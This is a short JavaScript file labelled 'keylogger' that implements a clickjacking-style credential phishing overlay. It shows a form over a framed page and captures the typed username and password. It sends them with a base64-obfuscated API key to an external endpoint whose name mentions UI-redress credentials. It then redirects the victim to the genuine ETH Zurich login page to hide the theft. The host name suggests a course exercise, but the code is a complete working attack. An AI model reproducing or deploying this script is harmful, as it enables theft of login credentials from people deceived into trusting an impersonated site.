// keylogger

const apiKey = atob(
  "TVFBM0FEVUFNZ0F5QURRQU1nQTBBRGtBTVFBNEFEY0FPUUF6QURVQU53QTJBRGtB"
);
let globalBuffer = ""

let USER = document.getElementById('user')
let PASS = document.getElementById('pass')
let BTN = document.getElementById('button')

async function logCreds(u, p) {
  const payload = {
    username: u,
    password: p
  };

  console.log(payload)

  await fetch("https://m183.gibz-informatik.ch/api/uiredresscredential", {
    method: "POST",
    mode: 'cors',
    cache: 'no-cache',
    credentials: 'omit',
    referrerPolicy: 'no-referrer',
    headers: {
      "Content-Type": "application/json",
      "X-Api-Key": apiKey,
    },
    body: JSON.stringify(payload),
  });
}

function startListeners() {
  document.getElementById('test').addEventListener('load', (e) => {
    const h = document.body.offsetHeight
    const w = document.body.offsetWidth

    document.getElementById('form').style.visibility = 'visible'
    document.getElementById('form').style.height = h
    document.getElementById('form').style.width = w

    USER.focus()
  })

  BTN.addEventListener('click', submitCreds)

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      submitCreds()
    }
  })
}

async function submitCreds() {
  // log to remote
  await logCreds(USER.value || 'Kein Benutzername', PASS.value || 'Kein Passwort')
  // redirect to original site
  setTimeout(() => {
    window.location = 'https://ethz.ch/login/en.html?resource=%2Fcontent%2Fmain%2Fen.html'
  }, 200);
}

startListeners()